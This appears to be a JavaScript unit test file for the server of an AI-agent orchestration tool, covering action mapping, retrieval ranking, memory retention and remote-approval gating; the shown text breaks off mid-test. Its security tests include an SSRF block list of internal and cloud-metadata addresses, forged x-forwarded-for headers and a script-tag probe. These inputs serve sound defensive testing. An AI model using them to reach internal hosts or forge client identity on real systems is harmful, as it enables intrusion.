// Pure unit tests for standalone logic (no server, no Latch, no model). Imports the exported
// helpers from server.mjs directly.  run:  node test/units.test.mjs
import {
  ipv4Blocked, ipBlocked, normalizeAction, safeParse, ragTerms, expectsDeliverable,
  resolveReport, goalObjective, normKRs, cadenceMs, cleanPolicyWhen, htmlToText,
  ensureBudget, renderChecklist, validDeliverableName, workProduct,
  planObjective, normPlanItem, normSop, normSopSteps, sopObjective,
  rankByRelevance, recallSharedMemory, makeSemaphore,
  approvalActType, remoteBlocksApproval, REMOTE_MODE,
  packVec, unpackVec, cosine, rrfFuse, memoryKey, memoryText,
  objectiveSignature, dedupeMemories, deliverableEmbedText, deliverableTitle,
  chunkDocument, deliverableChunks, modelUnreachable, trimVersions, clientKey, isLoopback,
  startLogTee, webhookBody,
  normalizeFinding, verifyFinding, findingCheckAllowed,
  LENSES, pickLens, investigateObjective, investigate,
} from "../server.mjs";
import { mkdtempSync, readdirSync, readFileSync, rmSync, statSync } from "node:fs";
import { tmpdir } from "node:os";
import { join } from "node:path";

let pass = 0, fail = 0;
const chk = (label, cond) => { console.log(`${cond ? "✓" : "✗"} ${label}`); cond ? pass++ : fail++; };
const eq = (label, got, want) => { const c = JSON.stringify(got) === JSON.stringify(want); console.log(`${c ? "✓" : "✗"} ${label}` + (c ? "" : `  got ${JSON.stringify(got)} want ${JSON.stringify(want)}`)); c ? pass++ : fail++; };

console.log("# SSRF guard — ipv4Blocked (private/internal ranges must be blocked)");
for (const ip of ["0.0.0.1", "10.0.0.1", "127.0.0.1", "169.254.169.254", "172.16.0.1", "172.31.255.1", "192.168.1.1", "100.64.0.1", "100.127.0.1", "198.18.0.1", "198.19.0.1", "224.0.0.1", "255.255.255.255", "999.1.1.1", "1.2.3"])
  chk(`  blocked: ${ip}`, ipv4Blocked(ip) === true);
for (const ip of ["8.8.8.8", "1.1.1.1", "172.15.0.1", "172.32.0.1", "192.167.1.1", "100.63.255.1", "100.128.0.1", "198.17.0.1", "198.20.0.1", "223.255.255.255"])
  chk(`  allowed: ${ip}`, ipv4Blocked(ip) === false);

console.log("# SSRF guard — ipBlocked (IPv6 + mapped)");
for (const ip of ["::1", "::", "fe80::1", "fc00::1", "fd12::1", "::ffff:127.0.0.1", "::ffff:10.0.0.1"])
  chk(`  blocked: ${ip}`, ipBlocked(ip) === true);
for (const ip of ["2606:4700:4700::1111", "::ffff:8.8.8.8"])
  chk(`  allowed: ${ip}`, ipBlocked(ip) === false);

console.log("# normalizeAction — corrects the local model's common action mistakes");
eq("  bash → shell", normalizeAction({ type: "propose_action", actionType: "bash", command: "ls" }, "").actionType, "shell");
eq("  curl → api_call", normalizeAction({ type: "propose_action", actionType: "curl" }, "").actionType, "api_call");
// GitHub issues. The read is named `read_issues`, NOT `github_issues`, precisely so that a one-letter slip
// can't turn "show me the backlog" into an outward-facing post that emails every watcher. These
// assertions pin the direction of every synonym, because the failure is silent and public.
{
  const norm = (t) => normalizeAction({ type: "propose_action", actionType: t, title: "x", command: "y" }, "").actionType;
  for (const t of ["read_issues", "github_issues", "list_issues", "get_issues", "issues", "open_issues", "issue_list"])
    eq(`  ${t} → read_issues (a read)`, norm(t), "read_issues");
  for (const t of ["github_issue", "issue", "new_issue", "open_issue", "create_issue", "file_issue", "raise_issue", "bug_report"])
    eq(`  ${t} → github_issue (a post)`, norm(t), "github_issue");
  for (const t of ["github_comment", "issue_comment", "comment", "comment_issue", "reply_issue", "reply"])
    eq(`  ${t} → github_comment`, norm(t), "github_comment");
  for (const t of ["github_pr", "pull_request", "pullrequest", "pr", "open_pr", "create_pr", "raise_pr", "merge_request"])
    eq(`  ${t} → github_pr`, norm(t), "github_pr");
  chk("  'pr' does not collide with the issue actions", !["github_issue", "github_comment", "read_issues"].includes(norm("pr")));
  // The dangerous confusions, asserted as NOT happening rather than left to inspection of the lists.
  chk("  plural 'issues' never becomes the singular post action", norm("issues") !== "github_issue");
  chk("  singular 'issue' never becomes the read action", norm("issue") !== "read_issues");
  chk("  'github' alone still means a file commit, not an issue", norm("github") === "github_file");
  chk("  'backlog' still means the INTERNAL plan, not GitHub", norm("backlog") === "plan_add");
}
eq("  web_research w/o URL → web_search", normalizeAction({ type: "propose_action", actionType: "web_research", command: "find pricing" }, "").actionType, "web_search");
{ const r = normalizeAction({ type: "propose_action", actionType: "web_search", command: "https://a.com/x" }, "");
  chk("  web_search w/ URL → web_research + command=url", r.actionType === "web_research" && r.command === "https://a.com/x"); }
eq("  'other' w/ URL → web_research", normalizeAction({ type: "propose_action", actionType: "other", command: "see https://x.com/p" }, "").actionType, "web_research");
eq("  finish passes through untouched", normalizeAction({ type: "finish" }, "write a note").type, "finish");
eq("  bare action fields promote to propose_action", normalizeAction({ actionType: "file_write", command: "# Doc", title: "t" }, "").type, "propose_action");

console.log("# safeParse — tolerant JSON extraction");
eq("  plain object", safeParse('{"a":1}'), { a: 1 });
eq("  strips <think> + code fence", safeParse('<think>reasoning</think>\n```json\n{"a":2}\n```'), { a: 2 });
eq("  ignores trailing junk after object", safeParse('{"a":3} and some words'), { a: 3 });
eq("  no object → null", safeParse("just prose, no json"), null);
eq("  empty → null", safeParse(""), null);

console.log("# ragTerms — significant-term tokenizer");
chk("  keeps words >3 chars, drops short", (() => { const t = ragTerms("pricing competitor fox"); return t.includes("pricing") && t.includes("competitor") && !t.includes("fox"); })());
eq("  dedupes", ragTerms("pricing pricing competitor"), ["pricing", "competitor"]);
chk("  drops domain stopwords (report/document/plan)", ragTerms("report document plan").length === 0);

console.log("# expectsDeliverable");
chk("  'write a report' → true", expectsDeliverable("write a report") === true);
chk("  'summarize the notes' → true", expectsDeliverable("summarize the notes") === true);
chk("  'just say hi' → false", expectsDeliverable("just say hi") === false);

console.log("# resolveReport — tolerant assignee matching, no double-assignment");
{ const reps = [{ id: "1", name: "Ada Lovelace", role: "Engineer" }, { id: "2", name: "Bob Smith", role: "PM" }];
  eq("  exact full name", resolveReport(reps, "ada lovelace", new Set())?.id, "1");
  eq("  unique first name", resolveReport(reps, "Ada", new Set())?.id, "1");
  eq("  role match", resolveReport(reps, "PM", new Set())?.id, "2");
  eq("  substring", resolveReport(reps, "Smith", new Set())?.id, "2");
  eq("  no match → null", resolveReport(reps, "Zoltan", new Set()), null);
  const used = new Set(); resolveReport(reps, "Ada", used);
  eq("  won't reuse an already-used report", resolveReport(reps, "Ada", used), null); }

console.log("# goalObjective");
{ const s = goalObjective({ title: "Grow revenue", detail: "Q3 push", keyResults: [{ text: "Land 5 deals", done: false }, { text: "Ship v2", done: true }] });
  chk("  includes title + detail", s.includes("Grow revenue") && s.includes("Q3 push"));
  chk("  lists OPEN krs only", s.includes("Land 5 deals") && !s.includes("Ship v2")); }

console.log("# normKRs");
eq("  strings → objects", normKRs(["one", "two"]), [{ id: 0, text: "one", done: false }, { id: 1, text: "two", done: false }]);
eq("  keeps done flag", normKRs([{ text: "x", done: true }]), [{ id: 0, text: "x", done: true }]);
eq("  drops empty text", normKRs(["", "ok"]), [{ id: 1, text: "ok", done: false }]);
eq("  non-array → []", normKRs(null), []);

console.log("# cadenceMs");
eq("  hourly", cadenceMs("hourly"), 3600e3);
eq("  daily", cadenceMs("daily"), 864e5);
eq("  weekly", cadenceMs("weekly"), 7 * 864e5);
eq("  unknown → daily", cadenceMs("nonsense"), 864e5);

console.log("# cleanPolicyWhen — sanitizes rule conditions");
eq("  keeps + normalizes known fields, drops junk",
  cleanPolicyWhen({ actionType: "SHELL", agentId: "a1", costOver: 5, titleContains: "x", urlHost: "API.GitHub.com", bogus: 1 }),
  { actionType: "shell", agentId: "a1", costOver: 5, titleContains: "x", urlHost: "api.github.com" });
eq("  drops unrecognized actionType", cleanPolicyWhen({ actionType: "nope" }), {});
eq("  drops negative costOver", cleanPolicyWhen({ costOver: -3 }), {});
eq("  empty → {}", cleanPolicyWhen({}), {});

console.log("# htmlToText");
{ const t = htmlToText("<p>Hi <b>there</b></p><script>alert(1)</script>");
  chk("  strips tags + script, keeps text", /Hi\s+there/.test(t) && !t.includes("alert") && !t.includes("<")); }

console.log("# normalizeAction — GitHub publish mapping");
for (const at of ["github", "git", "commit", "publish", "push", "gh"])
  eq(`  ${at} → github_file`, normalizeAction({ type: "propose_action", actionType: at, title: "x.md", command: "hi" }, "").actionType, "github_file");
for (const at of ["create_repo", "new_repo", "github_new_repo"])
  eq(`  ${at} → github_repo`, normalizeAction({ type: "propose_action", actionType: at }, "").actionType, "github_repo");

console.log("# normalizeAction — more edge cases");
eq("  exec → shell", normalizeAction({ type: "propose_action", actionType: "terminal", command: "ls" }, "").actionType, "shell");
eq("  http_request → api_call", normalizeAction({ type: "propose_action", actionType: "http_request" }, "").actionType, "api_call");
{ const r = normalizeAction({ type: "propose_action", actionType: "note" }, "write a detailed onboarding guide for new hires with sections");
  // 'note' + a write-y objective but no long content and no url → stays note (not enough to infer file_write)
  chk("  vague 'note' with short content stays note", r.actionType === "note"); }
{ const long = "x".repeat(200);
  const r = normalizeAction({ type: "propose_action", actionType: "other", command: long }, "write a report");
  eq("  'other' + long write content → file_write", r.actionType, "file_write"); }

console.log("# ensureBudget — org normalization + safe defaults");
{ const o = ensureBudget({ agents: [{ name: "X", salary: 999 }] });
  const a = o.agents[0];
  chk("  agent gets safe defaults", a.tier === "supervised" && Array.isArray(a.allow) && Array.isArray(a.lessons) && a.budgetUsd === 0 && a.tokensUsed === 0);
  chk("  legacy fake salary removed", a.salary === undefined);
  chk("  budget/guardrails/collections backfilled", o.budget.tokens === 0 && typeof o.guardrails === "object" && Array.isArray(o.policies) && Array.isArray(o.triggers) && Array.isArray(o.goals) && typeof o.deliverables === "object"); }
{ const o = ensureBudget({ guardrails: { autoApproveUnderUsd: 5 } });
  chk("  preserves existing guardrail values", o.guardrails.autoApproveUnderUsd === 5 && o.guardrails.maxActionsPerRun === 0); }

console.log("# renderChecklist — DoD checklist markdown");
{ const md = renderChecklist({ title: "Welcome note", objective: "write it", attempt: 0, verdict: "shortfall",
    criteria: [{ text: "has a greeting", status: "met" }, { text: "under 200 words", status: "unmet", note: "too long" }, { text: "signed", status: "open" }] });
  chk("  header + progress line", md.includes("# Checklist — Welcome note") && md.includes("**Progress:** 1/3 met"));
  chk("  met item checked, unmet shows note", md.includes("- [x] has a greeting") && md.includes("- [ ] under 200 words — ⚠ too long"));
  chk("  open item marked not-verified", md.includes("- [ ] signed — ⬜ not yet verified")); }

console.log("# validDeliverableName — API filename gate (requires a real dotted extension)");
for (const n of ["report.md", "a_b-c.csv", "data.json", "x.y", "Notes.TXT"]) chk(`  accepts ${n}`, validDeliverableName(n) === true);
for (const n of ["noextension", "bad name.md", "-leading.md", "a.", ".hidden", "", "a/b.md"]) chk(`  rejects ${JSON.stringify(n)}`, validDeliverableName(n) === false);

console.log("# normalizeAction — passthroughs (already-correct actions untouched)");
for (const at of ["read_file", "purchase", "email_draft", "shell", "api_call"])
  eq(`  ${at} passthrough`, normalizeAction({ type: "propose_action", actionType: at, command: "x" }, "").actionType, at);
eq("  escalate passes through", normalizeAction({ type: "escalate" }, "write a doc").type, "escalate");
eq("  web_search w/o command falls back to details", normalizeAction({ type: "propose_action", actionType: "web_search", details: "find rivals" }, "").command, "find rivals");

console.log("# ensureBudget — legacy migration");
{ const o = ensureBudget({ budget: { money: 999, currency: "gold", tokens: 5 } });
  chk("  drops fake tycoon money/currency, keeps real tokens", o.budget.money === undefined && o.budget.currency === undefined && o.budget.tokens === 5 && o.budget.funds === 0); }
{ const o = ensureBudget({ agents: [{ name: "Keep", tier: "trusted" }] });
  chk("  preserves an agent's existing tier", o.agents[0].tier === "trusted"); }
{ const o = ensureBudget({});
  chk("  builds all collections from nothing", Array.isArray(o.agents) && Array.isArray(o.policies) && Array.isArray(o.goals) && Array.isArray(o.triggers) && typeof o.deliverables === "object" && typeof o.notify === "object"); }

console.log("# workProduct — assembles a run's output");
eq("  bullets + outcome; blank-detail artifact dropped",
  workProduct("shipped", [{ title: "A", detail: "did a" }, { title: "B", detail: "" }]), "• A: did a\nOutcome: shipped");
chk("  a stopped run omits the Outcome tail", !workProduct("(stopped by CEO)", [{ title: "A", detail: "x" }]).includes("Outcome"));
eq("  no artifacts, live summary → Outcome line", workProduct("just the summary", []), "Outcome: just the summary");
eq("  no artifacts + stopped → bare summary (the || fallback)", workProduct("(stopped by CEO)", []), "(stopped by CEO)");

console.log("# safeParse — structural edge cases");
eq("  nested objects", safeParse('{"a":{"b":2}}'), { a: { b: 2 } });
eq("  brace inside a string doesn't end the object", safeParse('{"a":"has } and { braces"}'), { a: "has } and { braces" });
eq("  a top-level array is not an object → null", safeParse("[1,2,3]"), null);

// Deliverable retrieval used to have its own term-counting ranker (rankDeliverables, removed
// 2026-07-30). It required >= 2 distinct query terms to match at all and measured 3/14 recall@3 against
// BM25's 6/14 and 12/14 fused with vectors — see eval/recall-eval.mjs. Deliverables are now ranked with
// the same BM25 + vector fusion as memory, so the ranker below is what covers that path.
console.log("# deliverable lexical ranking — BM25 over filename + content");
{ const docs = [
    { name: "pricing-tiers.md", content: "our pricing tiers and competitor pricing comparison" },
    { name: "hello.md", content: "hi there, welcome" },
    { name: "market-analysis.md", content: "competitor pricing analysis of the market" } ];
  const lex = (q, limit = 3) => rankByRelevance(q, docs, (d) => `${d.name.replace(/[-_.]+/g, " ")} ${d.content}`, limit).map((r) => r.item.name);
  const r = lex("competitor pricing analysis");
  chk("  ranks the matching docs, not the unrelated one", r.length >= 2 && !r.includes("hello.md"));
  chk("  the best match leads", r[0] === "market-analysis.md" || r[0] === "pricing-tiers.md");
  // The old ranker needed TWO matching terms; one is now enough, which is what fixed paraphrases.
  chk("  a single matching term still retrieves", lex("pricing").length >= 1);
  // The filename is part of the indexed text, so its words are searchable even if the body omits them.
  chk("  filename words are searchable", lex("tiers").includes("pricing-tiers.md"));
  eq("  limit respected", lex("competitor pricing analysis", 1).length, 1); }

console.log("# rankByRelevance — pure-JS BM25 relevance ranker");
{ const items = [
    { t: "quarterly revenue report and financial forecast" },
    { t: "office snack inventory and coffee supplies" },
    { t: "revenue growth analysis with forecast models" } ];
  const r = rankByRelevance("revenue forecast", items, (x) => x.t, 5);
  chk("  relevant docs ranked, irrelevant excluded", r.length === 2 && r.every((x) => !x.item.t.includes("snack")));
  chk("  most relevant first (both query terms)", r[0].item.t.includes("revenue") && r[0].item.t.includes("forecast"));
  eq("  no query terms → []", rankByRelevance("the a of to", items, (x) => x.t), []);
  eq("  empty corpus → []", rankByRelevance("revenue", [], (x) => x.t), []);
  chk("  limit respected", rankByRelevance("revenue forecast analysis", items, (x) => x.t, 1).length === 1); }

console.log("# recallSharedMemory — cross-agent BM25 recall");
{ const org = { agents: [
    { id: "a1", name: "Zoe", role: "Marketing", memory: [{ objective: "draft Q3 marketing themes", summary: "three themes: growth, retention, trust" }] },
    { id: "a2", name: "Morgan", role: "CISO", memory: [{ objective: "office coffee order", summary: "bought beans" }, { objective: "Q3 security review of marketing themes", summary: "flagged trust claims need audit" }] } ] };
  const r = recallSharedMemory(org, "Q3 marketing themes", 4);
  chk("  pools across agents (Zoe + Morgan surface, coffee doesn't)", r.length === 2 && r.some((m) => m.agentName === "Zoe") && r.some((m) => m.agentName === "Morgan") && !r.some((m) => /coffee/.test(m.summary)));
  chk("  excludeAgentId drops that agent", recallSharedMemory(org, "Q3 marketing themes", 4, "a1").every((m) => m.agentName !== "Zoe"));
  chk("  carries author + role", (() => { const m = r.find((x) => x.agentName === "Zoe"); return m && m.role === "Marketing"; })()); }

console.log("# normSop / sopObjective — process templates");
{ const sop = normSop({ name: "Publish post", steps: [{ task: "research", assignee: "Ada" }, "draft | Ben", { task: "", assignee: "X" }] });
  chk("  keeps valid steps, drops empty-task, ids assigned", sop && sop.steps.length === 2 && sop.steps[0].assignee === "Ada" && sop.steps[1].task === "draft" && sop.steps[1].assignee === "Ben");
  chk("  has id/runs/timestamps", !!sop.id && Array.isArray(sop.runs) && !!sop.createdAt);
  const obj = sopObjective(sop);
  chk("  objective lists steps in order with assignees", obj.includes("Publish post") && obj.includes("1. research") && obj.includes("Ada")); }
eq("  no name → null", normSop({ steps: [{ task: "x" }] }), null);
eq("  no steps → null", normSop({ name: "Empty" }), null);
eq("  normSopSteps caps at 12", normSopSteps(Array.from({ length: 20 }, (_, i) => ({ task: "t" + i }))).length, 12);

console.log("# planObjective + normPlanItem — the company backlog");
{ const s = planObjective({ title: "Ship onboarding", detail: "email + docs" });
  chk("  objective includes title + detail", s.includes("Ship onboarding") && s.includes("email + docs")); }
{ const it = normPlanItem({ title: "Backlog thing" });
  chk("  new item: todo status, empty runs/notes, has id", it && it.status === "todo" && Array.isArray(it.runs) && Array.isArray(it.notes) && !!it.id && it.detail === ""); }
eq("  empty title → null", normPlanItem({ title: "  " }), null);
eq("  valid status honored", normPlanItem({ title: "T", status: "doing" }).status, "doing");
eq("  bad status → todo", normPlanItem({ title: "T", status: "nonsense" }).status, "todo");
chk("  owner defaults from arg", normPlanItem({ title: "T" }, "agent_9").agentId === "agent_9");

// The per-agent memory cap keeps 8 entries. persistRun used to blind-prepend, so repeats of ONE
// objective ate the slots and evicted distinct history — measured live: 5 of one agent's 8 rows were the
// same e2e objective and three weeks of real work was gone. persistRun now runs the same dedupe the
// ranker uses BEFORE truncating, so the cap holds 8 distinct objectives rather than 8 rows.
console.log("# per-agent memory retention — duplicates must not evict distinct history");
{
  const KEEP = 8;
  const dup = (n, at) => ({ at, objective: "Save a one-paragraph welcome note for a new customer named Sam.", summary: `run ${n}` });
  const distinct = (i) => ({ at: 100 + i, objective: `Distinct task number ${i} about topic ${i}.`, summary: `did ${i}` });
  // Five repeats of one objective arriving on top of four distinct memories.
  const incoming = [dup(5, 205), dup(4, 204), dup(3, 203), dup(2, 202), dup(1, 201)];
  const history = [distinct(4), distinct(3), distinct(2), distinct(1)];
  const blind = [...incoming, ...history].slice(0, KEEP);
  chk("  the old blind prepend loses distinct history (this is the bug, asserted)", blind.filter((m) => /Distinct/.test(m.objective)).length === 3);
  const fixed = dedupeMemories([...incoming, ...history]).slice(0, KEEP);
  chk("  after write-time dedupe all four distinct memories survive", fixed.filter((m) => /Distinct/.test(m.objective)).length === 4);
  chk("  the five repeats collapse to one slot", fixed.filter((m) => /welcome note/.test(m.objective)).length === 1);
  chk("  and the whole history fits inside the cap", fixed.length === 5 && fixed.length <= KEEP);
  // A summary-less repeat must not displace the attempt that actually produced work.
  const withWork = { at: 300, objective: "Write the quarterly brief.", summary: "Saved brief.md with three sections." };
  const stopped = { at: 400, objective: "Write the quarterly brief.", summary: "(stopped without a summary)" };
  const merged = dedupeMemories([stopped, withWork]);
  chk("  a later STOPPED run does not overwrite the attempt that did the work", merged.length === 1 && /Saved brief/.test(merged[0].summary));
}

// Version metadata was capped at 20 while the .versions DIRECTORY was never pruned, so archives past the
// cap became files nothing listed and nothing deleted (measured: 116 on disk, 10 listed). Now the same
// split drives both, which makes the off-by-one the entire risk: `drop` too small leaks forever, too
// large unlinks an archive that is still listed. So assert keep+drop partition the input exactly.
console.log("# trimVersions — metadata cap and on-disk deletion must agree");
{
  const mk = (n) => Array.from({ length: n }, (_, i) => ({ at: i + 1 }));
  const partitions = (n, k) => { const t = trimVersions(mk(n), k); return JSON.stringify([...t.drop, ...t.keep]) === JSON.stringify(mk(n)); };
  eq("  under the cap keeps everything, drops nothing", trimVersions(mk(3), 20), { keep: mk(3), drop: [] });
  eq("  exactly at the cap drops nothing", trimVersions(mk(20), 20).drop, []);
  eq("  one over the cap drops exactly the oldest", trimVersions(mk(21), 20).drop, [{ at: 1 }]);
  chk("  one over the cap keeps exactly the cap", trimVersions(mk(21), 20).keep.length === 20);
  eq("  five over the cap drops the five oldest, in order", trimVersions(mk(25), 20).drop.map((v) => v.at), [1, 2, 3, 4, 5]);
  for (const [n, k] of [[0, 20], [1, 1], [20, 20], [21, 20], [25, 20], [100, 3]])
    chk(`  keep+drop reconstruct the input exactly (n=${n}, keep=${k})`, partitions(n, k));
  eq("  a non-array is handled, not thrown on", trimVersions(undefined, 20), { keep: [], drop: [] });
  chk("  a nonsense cap floors at 1 rather than dropping everything", trimVersions(mk(4), 0).keep.length === 1);
}

// The failed-auth damper counts failures per client. `socket.remoteAddress` alone broke the moment Bureau
// went behind `tailscale serve`: every request arrives from 127.0.0.1, so a laptop, a phone and the local
// browser shared ONE bucket, and since a success cleared it the operator's own traffic continuously wiped
// any attacker's counter. Verified live that tailscale DOES send x-forwarded-for, so per-client keying is
// possible — but trusting a forwarding header is exactly where this fix goes wrong, hence both directions.
console.log("# clientKey — per-client throttling behind a proxy, without trusting a forgeable header");
{
  const req = (addr, headers = {}) => ({ socket: { remoteAddress: addr }, headers });
  for (const ip of ["127.0.0.1", "::1", "::ffff:127.0.0.1", "127.0.0.53"]) chk(`  loopback: ${ip}`, isLoopback(ip) === true);
  for (const ip of ["100.64.0.1", "10.0.0.4", "8.8.8.8", "fd7a:115c::1", ""]) chk(`  not loopback: ${ip || "(empty)"}`, isLoopback(ip) === false);

  eq("  loopback + no forwarding header → the socket itself", clientKey(req("127.0.0.1")), "127.0.0.1");
  eq("  loopback + x-forwarded-for → the forwarded client", clientKey(req("127.0.0.1", { "x-forwarded-for": "100.64.0.1" })), "proxy:100.64.0.1");
  eq("  two tailnet clients get DIFFERENT keys (the whole point)",
    [clientKey(req("127.0.0.1", { "x-forwarded-for": "100.64.0.1" })), clientKey(req("127.0.0.1", { "x-forwarded-for": "100.64.0.2" }))],
    ["proxy:100.64.0.1", "proxy:100.64.0.2"]);
  // Each proxy APPENDS the address it saw, so the rightmost hop is the one our trusted proxy observed and
  // everything left of it is caller-supplied. Taking the leftmost would let a client forge its identity.
  eq("  a client-forged x-forwarded-for cannot win: rightmost hop is used", clientKey(req("127.0.0.1", { "x-forwarded-for": "1.2.3.4, 100.64.0.1" })), "proxy:100.64.0.1");
  eq("  whitespace in the hop list is tolerated", clientKey(req("127.0.0.1", { "x-forwarded-for": " 1.2.3.4 ,  100.64.0.1 " })), "proxy:100.64.0.1");
  // The dangerous direction: a DIRECT remote peer setting its own header. Honouring that would let it mint
  // a fresh identity per request and evade the damper completely — worse than the bug being fixed.
  eq("  a DIRECT remote peer's forwarding header is IGNORED", clientKey(req("203.0.113.9", { "x-forwarded-for": "127.0.0.1" })), "203.0.113.9");
  eq("  ...even when it forges many hops", clientKey(req("203.0.113.9", { "x-forwarded-for": "a, b, c" })), "203.0.113.9");
  eq("  x-real-ip is honoured only from loopback too", clientKey(req("127.0.0.1", { "x-real-ip": "100.1.1.1" })), "proxy:100.1.1.1");
  eq("  and ignored from a direct peer", clientKey(req("203.0.113.9", { "x-real-ip": "127.0.0.1" })), "203.0.113.9");
  eq("  an empty forwarding header falls back to the socket", clientKey(req("127.0.0.1", { "x-forwarded-for": "  ,  " })), "127.0.0.1");
  eq("  a proxied key can never collide with a direct peer of the same address",
    [clientKey(req("127.0.0.1", { "x-forwarded-for": "203.0.113.9" })), clientKey(req("203.0.113.9"))], ["proxy:203.0.113.9", "203.0.113.9"]);
  eq("  a missing socket address does not throw", clientKey({ headers: {} }), "unknown");
}

// A run where EVERY model call failed did no work. Before this predicate existed, such a run reported
// verdict "none" and the delegation safety net wrote its own failure placeholders into the inbox as a
// draft reading "The team completed the assigned tasks." — on a run that used zero tokens. The guard has
// to be exact in BOTH directions: too loose and one flaky call condemns a run that actually delivered.
console.log("# modelUnreachable — every call failed vs. some calls failed");
chk("  no calls at all → not unreachable (nothing was attempted)", modelUnreachable({}) === false);
chk("  all calls failed → unreachable", modelUnreachable({ llmFail: 5, llmOk: 0 }) === true);
chk("  one success among failures → NOT unreachable (ordinary flakiness)", modelUnreachable({ llmFail: 9, llmOk: 1 }) === false);
chk("  all calls succeeded → not unreachable", modelUnreachable({ llmFail: 0, llmOk: 4 }) === false);
chk("  a single failure and nothing else → unreachable", modelUnreachable({ llmFail: 1 }) === true);
chk("  undefined run → not unreachable (never condemn on missing data)", modelUnreachable(undefined) === false);

// makeSemaphore is async, so run it in a top-level await block before the summary prints.
await (async () => {
  console.log("# makeSemaphore — bounded async concurrency (parallel delegation primitive)");
  const sem = makeSemaphore(3);
  let active = 0, peak = 0, done = 0;
  const started = Date.now();
  const results = await Promise.all(Array.from({ length: 12 }, (_, i) => sem(async () => {
    active++; peak = Math.max(peak, active);
    await new Promise((r) => setTimeout(r, 15));
    active--; done++; return i * 2;
  })));
  const elapsed = Date.now() - started;
  // This must assert peak REACHES the cap, not merely that it doesn't exceed it. The original version
  // checked `1 <= peak <= 3`, which a semaphore that serialised everything would also satisfy — a test
  // that cannot fail on the bug it exists to catch, which is worse than no test because it reassures.
  eq("  actually reaches the concurrency cap", peak, 3);
  chk("  never exceeds the cap", peak <= 3);
  // Wall-clock corroborates independently: 12 tasks x 15ms is ~180ms serial, ~60ms at a cap of 3.
  chk(`  finishes far faster than serial (${elapsed}ms vs ~180ms serial)`, elapsed < 140);
  chk("  runs every task", done === 12);
  eq("  preserves result order", results, Array.from({ length: 12 }, (_, i) => i * 2));
})();

console.log("# remote mode — which pending approvals Bureau refuses to APPROVE (BUREAU_REMOTE=1)");
chk("  REMOTE_MODE is off by default in tests", REMOTE_MODE === false);
// The act- tag is what fileApproval stamps on; Latch's own `type` is too coarse to use (web_search,
// shell and api_call all arrive as "command"), which is the whole reason the tag exists. The separator
// is a HYPHEN, not a colon: Latch strips colons from contextTags, so "act:shell" arrives as "actshell".
eq("  approvalActType reads the act- tag", approvalActType({ contextTags: ["bureau", "act-shell", "agent-x"] }), "shell");
eq("  approvalActType keeps underscores in the type", approvalActType({ contextTags: ["act-email_draft"] }), "email_draft");
eq("  approvalActType ignores a colon-mangled legacy tag", approvalActType({ contextTags: ["bureau", "actshell"] }), "");
eq("  approvalActType tolerates no tags", approvalActType({}), "");
eq("  approvalActType tolerates junk", approvalActType({ contextTags: ["bureau", 7, null] }), "");
const tagged = (act, extra = {}) => ({ contextTags: ["bureau", `act-${act}`, "agent-x"], ...extra });
// Hard floor: always a human, so never approvable from a remote Bureau.
for (const act of ["shell", "api_call", "email_draft", "github_repo", "mcp_call"])
  chk(`  blocks ${act}`, remoteBlocksApproval(tagged(act), { autoApproveUnderUsd: 100 }) === true);
// Safe, reversible, in-sandbox: still approvable remotely (only pending because of the agent's tier).
for (const act of ["web_search", "web_research", "read_file", "file_write", "note", "ask_peer"])
  chk(`  allows ${act}`, remoteBlocksApproval(tagged(act), { autoApproveUnderUsd: 100 }) === false);
// Stricter than the hard floor on purpose: a repo commit is reversible, but it writes outward with
// Latch's credential, and remote mode is for browsers trusted less than the host.
chk("  blocks github_file (stricter than the hard floor, deliberately)", remoteBlocksApproval(tagged("github_file"), {}) === true);
// Purchases follow the same ceiling rule the hard floor uses.
chk("  blocks a purchase over the ceiling", remoteBlocksApproval(tagged("purchase", { command: "Amount: $250.00" }), { autoApproveUnderUsd: 100 }) === true);
chk("  allows a purchase under the ceiling", remoteBlocksApproval(tagged("purchase", { command: "Amount: $12.00" }), { autoApproveUnderUsd: 100 }) === false);
chk("  blocks any purchase when no ceiling is set", remoteBlocksApproval(tagged("purchase", { command: "Amount: $1.00" }), {}) === true);
// FAIL CLOSED — an approval whose origin can't be established must not be approvable remotely.
chk("  fails closed on an untagged approval", remoteBlocksApproval({ contextTags: ["bureau", "agent:x"] }, {}) === true);
chk("  fails closed on a missing contextTags", remoteBlocksApproval({}, {}) === true);
chk("  fails closed on null", remoteBlocksApproval(null, {}) === true);
chk("  fails closed on an unrecognised act type", remoteBlocksApproval(tagged("something_new"), {}) === true);

console.log("# vectors — Float32 <-> BLOB round-trip");
{
  const v = [0.5, -0.25, 0, 1, -1, 0.123456];
  const back = [...unpackVec(packVec(v))];
  chk("  round-trips within float32 precision", back.every((x, i) => Math.abs(x - v[i]) < 1e-6));
  eq("  preserves length", back.length, v.length);
  eq("  packs 4 bytes per value", packVec(v).byteLength, v.length * 4);
  eq("  empty in, empty out", [...unpackVec(packVec([]))], []);
  // A truncated/garbled BLOB must not throw or produce a half-value.
  eq("  rejects a non-multiple-of-4 blob", [...unpackVec(Buffer.from([1, 2, 3]))], []);
  eq("  tolerates null", [...unpackVec(null)], []);
  // SQLite may hand back a bare Uint8Array rather than a Buffer, and BLOBs carry no alignment promise.
  const packed = packVec([1, 2, 3]);
  eq("  accepts a bare Uint8Array", [...unpackVec(new Uint8Array(packed))], [1, 2, 3]);
}

console.log("# vectors — cosine similarity");
chk("  identical vectors → 1", Math.abs(cosine(new Float32Array([1, 2, 3]), new Float32Array([1, 2, 3])) - 1) < 1e-6);
chk("  opposite vectors → -1", Math.abs(cosine(new Float32Array([1, 0]), new Float32Array([-1, 0])) + 1) < 1e-6);
chk("  orthogonal vectors → 0", Math.abs(cosine(new Float32Array([1, 0]), new Float32Array([0, 1]))) < 1e-6);
chk("  magnitude-invariant", Math.abs(cosine(new Float32Array([1, 1]), new Float32Array([9, 9])) - 1) < 1e-6);
// These all guard the same thing: a junk row must never be able to outrank a real match.
eq("  length mismatch → 0", cosine(new Float32Array([1, 2]), new Float32Array([1, 2, 3])), 0);
eq("  zero vector → 0", cosine(new Float32Array([0, 0]), new Float32Array([1, 2])), 0);
eq("  empty → 0", cosine(new Float32Array([]), new Float32Array([])), 0);
eq("  null → 0", cosine(null, new Float32Array([1])), 0);

console.log("# vectors — Reciprocal Rank Fusion");
{
  const id = (x) => x.k;
  const A = [{ k: "a" }, { k: "b" }, { k: "c" }];
  const B = [{ k: "c" }, { k: "b" }, { k: "a" }];
  const fused = rrfFuse([A, B], id, { limit: 3 });
  // With perfectly reversed rankings, the items that took a FIRST place edge out the one that was
  // middling in both: 1/(k+1) + 1/(k+3) > 2/(k+2), by convexity. So b — 2nd in both — comes last.
